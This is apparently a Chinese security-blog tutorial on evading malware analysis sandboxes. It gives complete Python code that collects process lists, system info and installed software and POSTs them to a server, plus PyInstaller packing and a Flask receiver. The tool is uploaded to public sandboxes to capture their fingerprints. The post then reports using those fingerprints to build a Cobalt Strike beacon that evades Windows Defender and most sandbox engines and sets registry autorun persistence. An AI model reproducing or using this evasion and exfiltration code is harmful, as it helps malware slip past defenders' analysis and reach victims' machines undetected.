@@ -1,0 +1,230 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p><strong>免责申明</strong></p>
+<ul>
+<li>本文所述的反沙箱技术及其应用仅供学习参考，旨在提供信息和观点。尽管我们尽力确保内容的准确性和可靠性，但作者对于任何因使用或依赖本文所提供的信息而导致的直接或间接损失，不承担任何责任。读者应根据自身情况进行评估，并在必要时咨询专业人士。本文不构成任何形式的法律、技术或安全建议。</li>
+</ul>
+<p><strong>前言</strong><br/>
+原文链接 <a href="https://mp.weixin.qq.com/s/rctg4CGpl2AAFzxbDZqrEg" target="_blank" title="免杀系列之反沙箱【BypassSandBox】">免杀系列之反沙箱【BypassSandBox】</a></p>
+<p>某天，在微信公众号里闲逛看到一位师傅发的一篇关于反沙箱的文章觉得很不错，里面给到了一些思路去获取沙箱的信息</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017163454-af2598f8-8c62-1.png"/></p>
+<p><strong>沙箱执行过程</strong></p>
+<ul>
+<li>提交可疑文件 -&gt; 静态分析 -&gt; 动态分析 -&gt; 行为检测 -&gt; 生成分析报告</li>
+</ul>
+<p>图为CS生成的裸马<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017165313-3def3a7e-8c65-1.png"/></p>
+<p><strong>测试环境搭建</strong></p>
+<ul>
+<li>程序代码为Python 3环境，为方便测试发送端和接收端都在本地测试</li>
+</ul>
+<p><strong>发送端</strong></p>
+<ul>
+<li>下载依赖<div class="highlight"><pre><span></span>pip install psutil requests
+</pre></div>
+</li>
+<li>导入模块<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">psutil</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="c1"># os: 用于与操作系统进行交互，获取当前工作目录等信息。</span>
+<span class="c1"># subprocess: 用于运行外部命令（如获取系统信息和已安装软件）。</span>
+<span class="c1"># psutil: 用于获取系统和进程信息。</span>
+<span class="c1"># requests: 用于发送HTTP请求，将数据发送到服务器。</span>
+</pre></div>
+</li>
+<li>获取进程列表<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">get_process_list</span><span class="p">():</span>
+  <span class="n">process_list</span> <span class="o">=</span> <span class="s2">"=== 进程列表 ===</span><span class="se">\n</span><span class="s2">"</span>
+  <span class="k">for</span> <span class="n">proc</span> <span class="ow">in</span> <span class="n">psutil</span><span class="o">.</span><span class="n">process_iter</span><span class="p">([</span><span class="s1">'pid'</span><span class="p">,</span> <span class="s1">'name'</span><span class="p">]):</span>
+      <span class="n">process_list</span> <span class="o">+=</span> <span class="n">f</span><span class="s2">"进程名称: {proc.info['name']}, PID: {proc.info['pid']}</span><span class="se">\n</span><span class="s2">"</span>
+  <span class="k">return</span> <span class="n">process_list</span>
+<span class="c1">#该函数获取当前系统中的所有进程及其名称和PID（进程ID），并以字符串形式返回。</span>
+</pre></div>
+</li>
+<li>获取当前目录和应用程序名称<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">get_current_directory_and_app_name</span><span class="p">():</span>
+  <span class="n">cwd</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">()</span>
+  <span class="n">exe_name</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)</span>
+  <span class="k">return</span> <span class="n">f</span><span class="s2">"当前工作目录: {cwd}</span><span class="se">\n</span><span class="s2">应用程序名称: {exe_name}</span><span class="se">\n</span><span class="s2">"</span>
+<span class="c1">#获取当前工作目录和当前程序的名称。</span>
+</pre></div>
+</li>
+<li>获取系统信息<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">get_system_info</span><span class="p">():</span>
+  <span class="n">system_info</span> <span class="o">=</span> <span class="s2">"=== 系统信息 ===</span><span class="se">\n</span><span class="s2">"</span>
+  <span class="k">try</span><span class="p">:</span>
+      <span class="n">output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="s2">"systeminfo"</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+      <span class="n">system_info</span> <span class="o">+=</span> <span class="n">output</span>
+  <span class="k">except</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">CalledProcessError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+      <span class="n">system_info</span> <span class="o">+=</span> <span class="n">f</span><span class="s2">"获取系统信息失败: {e}</span><span class="se">\n</span><span class="s2">"</span>
+  <span class="k">return</span> <span class="n">system_info</span>
+<span class="c1">#通过调用systeminfo命令获取系统详细信息，如果获取失败则捕获异常并返回错误信息。</span>
+</pre></div>
+</li>
+<li>获取已安装软件<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">get_installed_software</span><span class="p">():</span>
+  <span class="n">installed_software</span> <span class="o">=</span> <span class="s2">"=== 已安装软件 ===</span><span class="se">\n</span><span class="s2">"</span>
+  <span class="k">try</span><span class="p">:</span>
+      <span class="n">output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="s2">"wmic product list brief"</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+      <span class="n">installed_software</span> <span class="o">+=</span> <span class="n">output</span>
+  <span class="k">except</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">CalledProcessError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+      <span class="n">installed_software</span> <span class="o">+=</span> <span class="n">f</span><span class="s2">"获取已安装软件失败: {e}</span><span class="se">\n</span><span class="s2">"</span>
+  <span class="k">return</span> <span class="n">installed_software</span>
+<span class="c1">#使用wmic命令获取已安装软件的列表，处理异常以确保程序的健壮性。</span>
+</pre></div>
+</li>
+<li>发送数据到服务器<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">send_to_server</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">server_url</span><span class="p">):</span>
+ <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">server_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">'content'</span><span class="p">:</span> <span class="n">data</span><span class="p">})</span>
+ <span class="k">return</span> <span class="n">response</span>
+<span class="c1">#通过POST请求将收集到的数据发送到指定的服务器。</span>
+</pre></div>
+<strong>完整代码</strong><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">psutil</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="k">def</span> <span class="nf">get_process_list</span><span class="p">():</span>
+ <span class="n">process_list</span> <span class="o">=</span> <span class="s2">"=== 进程列表 ===</span><span class="se">\n</span><span class="s2">"</span>
+ <span class="k">for</span> <span class="n">proc</span> <span class="ow">in</span> <span class="n">psutil</span><span class="o">.</span><span class="n">process_iter</span><span class="p">([</span><span class="s1">'pid'</span><span class="p">,</span> <span class="s1">'name'</span><span class="p">]):</span>
+     <span class="n">process_list</span> <span class="o">+=</span> <span class="n">f</span><span class="s2">"进程名称: {proc.info['name']}, PID: {proc.info['pid']}</span><span class="se">\n</span><span class="s2">"</span>
+ <span class="k">return</span> <span class="n">process_list</span>
+<span class="k">def</span> <span class="nf">get_current_directory_and_app_name</span><span class="p">():</span>
+ <span class="n">cwd</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">()</span>
+ <span class="n">exe_name</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)</span>
+ <span class="k">return</span> <span class="n">f</span><span class="s2">"当前工作目录: {cwd}</span><span class="se">\n</span><span class="s2">应用程序名称: {exe_name}</span><span class="se">\n</span><span class="s2">"</span>
+<span class="k">def</span> <span class="nf">get_system_info</span><span class="p">():</span>
+ <span class="n">system_info</span> <span class="o">=</span> <span class="s2">"=== 系统信息 ===</span><span class="se">\n</span><span class="s2">"</span>
+ <span class="k">try</span><span class="p">:</span>
+     <span class="n">output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="s2">"systeminfo"</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+     <span class="n">system_info</span> <span class="o">+=</span> <span class="n">output</span>
+ <span class="k">except</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">CalledProcessError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+     <span class="n">system_info</span> <span class="o">+=</span> <span class="n">f</span><span class="s2">"获取系统信息失败: {e}</span><span class="se">\n</span><span class="s2">"</span>
+ <span class="k">return</span> <span class="n">system_info</span>
+<span class="k">def</span> <span class="nf">get_installed_software</span><span class="p">():</span>
+ <span class="n">installed_software</span> <span class="o">=</span> <span class="s2">"=== 已安装软件 ===</span><span class="se">\n</span><span class="s2">"</span>
+ <span class="k">try</span><span class="p">:</span>
+     <span class="n">output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="s2">"wmic product list brief"</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+     <span class="n">installed_software</span> <span class="o">+=</span> <span class="n">output</span>
+ <span class="k">except</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">CalledProcessError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+     <span class="n">installed_software</span> <span class="o">+=</span> <span class="n">f</span><span class="s2">"获取已安装软件失败: {e}</span><span class="se">\n</span><span class="s2">"</span>
+ <span class="k">return</span> <span class="n">installed_software</span>
+<span class="k">def</span> <span class="nf">send_to_server</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">server_url</span><span class="p">):</span>
+ <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">server_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">'content'</span><span class="p">:</span> <span class="n">data</span><span class="p">})</span>
+ <span class="k">return</span> <span class="n">response</span>
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+ <span class="c1"># 获取信息并存储在内存中</span>
+ <span class="n">process_info</span> <span class="o">=</span> <span class="n">get_process_list</span><span class="p">()</span>
+ <span class="n">current_info</span> <span class="o">=</span> <span class="n">get_current_directory_and_app_name</span><span class="p">()</span>
+ <span class="n">system_info</span> <span class="o">=</span> <span class="n">get_system_info</span><span class="p">()</span>
+ <span class="n">software_info</span> <span class="o">=</span> <span class="n">get_installed_software</span><span class="p">()</span>
+ <span class="n">content</span> <span class="o">=</span> <span class="n">process_info</span> <span class="o">+</span> <span class="n">current_info</span> <span class="o">+</span> <span class="n">system_info</span> <span class="o">+</span> <span class="n">software_info</span>
+ <span class="c1"># 发送到服务器</span>
+ <span class="n">server_url</span> <span class="o">=</span> <span class="s2">"http://127.0.0.1:8888/upload"</span>  <span class="c1"># 服务器的URL</span>
+ <span class="n">response</span> <span class="o">=</span> <span class="n">send_to_server</span><span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="n">server_url</span><span class="p">)</span>
+ <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+     <span class="k">print</span><span class="p">(</span><span class="s2">"信息已成功发送到服务器。"</span><span class="p">)</span>
+ <span class="k">else</span><span class="p">:</span>
+     <span class="k">print</span><span class="p">(</span><span class="s2">"发送信息失败。"</span><span class="p">)</span>
+ <span class="c1"># 信息发送完成，自动清理内存</span>
+ <span class="k">del</span> <span class="n">content</span>  <span class="c1"># 清理内存</span>
+ <span class="k">print</span><span class="p">(</span><span class="s2">"内存已清理。"</span><span class="p">)</span>
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
+ <span class="n">main</span><span class="p">()</span>
+</pre></div>
+<strong>打包exe</strong>
+</li>
+<li>安装PyInstaller<div class="highlight"><pre><span></span>pip install pyinstaller
+</pre></div>
+</li>
+<li>打包命令<div class="highlight"><pre><span></span>pyinstaller --onefile --noconsole --clean --strip 发送.py
+</pre></div>
+<strong>接收端</strong>
+</li>
+<li>下载依赖<div class="highlight"><pre><span></span>pip install Flask
+</pre></div>
+</li>
+<li>导入 Flask 模块<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span>
+<span class="c1">#Flask: Flask 是一个轻量级的 Web 框架，用于快速构建 Web 应用。</span>
+<span class="c1">#request: 用于处理来自客户端的请求数据。</span>
+</pre></div>
+</li>
+<li>
+<p>创建 Flask 应用实例</p>
+<div class="highlight"><pre><span></span><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+<span class="c1">#创建一个 Flask 应用实例，__name__ 参数使 Flask 知道应用的根目录。</span>
+</pre></div>
+<p><strong>定义路由和处理函数</strong></p>
+<div class="highlight"><pre><span></span><span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/upload'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'POST'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">upload_data</span><span class="p">():</span>
+  <span class="n">content</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'content'</span><span class="p">)</span>
+  <span class="k">if</span> <span class="ow">not</span> <span class="n">content</span><span class="p">:</span>
+      <span class="k">return</span> <span class="s1">'没有内容被上传'</span><span class="p">,</span> <span class="mi">400</span>
+
+  <span class="c1"># 保存内容到1.txt</span>
+  <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'1.txt'</span><span class="p">,</span> <span class="s1">'w'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">'utf-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+      <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+
+  <span class="k">return</span> <span class="s1">'内容上传成功'</span><span class="p">,</span> <span class="mi">200</span>
+<span class="c1">#@app.route('/upload', methods=['POST']): 定义一个路由，监听 /upload 地址的 POST 请求。</span>
+<span class="c1">#upload_data(): 处理上传数据的函数。</span>
+<span class="c1">#使用 request.form.get('content') 获取 POST 请求中表单数据的 content 字段。</span>
+<span class="c1">#检查 content 是否存在。如果不存在，返回状态码 400 和错误信息。</span>
+<span class="c1">#如果 content 存在，将其写入名为 1.txt 的文件，使用 UTF-8 编码保存。</span>
+<span class="c1">#返回状态码 200 和成功信息。</span>
+</pre></div>
+<p><strong>完整代码</strong></p>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span>
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/upload'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'POST'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">upload_data</span><span class="p">():</span>
+  <span class="n">content</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'content'</span><span class="p">)</span>
+  <span class="k">if</span> <span class="ow">not</span> <span class="n">content</span><span class="p">:</span>
+      <span class="k">return</span> <span class="s1">'没有内容被上传'</span><span class="p">,</span> <span class="mi">400</span>
+  <span class="c1"># 保存内容到1.txt</span>
+  <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'1.txt'</span><span class="p">,</span> <span class="s1">'w'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">'utf-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+      <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+  <span class="k">return</span> <span class="s1">'内容上传成功'</span><span class="p">,</span> <span class="mi">200</span>
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
+  <span class="c1"># 确保 Flask 在8888端口运行</span>
+  <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">'0.0.0.0'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8888</span><span class="p">)</span>
+</pre></div>
+<p><strong>测试</strong><br/>
+<strong>直接开两个vscode测试</strong><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017174210-14a28a48-8c6c-1.png"/><br/>
+<strong>运行接收端</strong><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017174402-5740f790-8c6c-1.png"/><br/>
+运行发送端<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017174525-89238eda-8c6c-1.png"/><br/>
+<strong>获取的txt</strong></p>
+</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017174948-25dc7818-8c6d-1.png"/></p>
+<p><strong>内容</strong><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017174756-e31ebd60-8c6c-1.png"/><br/>
+<strong>传沙箱测试</strong></p>
+<ul>
+<li>微步沙箱测试传不出来文件<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017175343-b216d6d4-8c6d-1.png"/>
+</li>
+<li>VT会传三个txt文件回来<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017175451-da6f95d0-8c6d-1.png"/><br/>
+<strong>写马儿测试</strong>
+</li>
+<li>Cobalt Strike4.8，没有使用任何混淆配置文件<br/>
+后面就可以根据传回来的沙箱环境特征针对性的反沙箱，C++写的马儿，使用g++编译打包，最后在使用strip去掉编译时间和符号<br/>
+实测能过Windows Defender动静态扫描，其他杀软没测试过<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017203137-c0ab9fac-8c83-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017203113-b2be8ed6-8c83-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017222409-7985531a-8c93-1.png"/>
+</li>
+<li>成功添加注册表自启动<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017222711-e5f5f428-8c93-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017222809-089f83cc-8c94-1.png"/><br/>
+<strong>最后</strong><br/>
+微步沙箱0/27<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017201620-9e4356d2-8c81-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017201654-b2c55aa6-8c81-1.png"/><br/>
+VT沙箱1/73，奈何本人太菜实在是做不到VT全绿<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017202259-8bffbece-8c82-1.png"/>
+</li>
+</ul>
+<hr/>
+<p>这也是我第一次尝试写这一类型的文章，可能有很多不足的地方还望师傅谅解！</p>
+</div>
+</div>
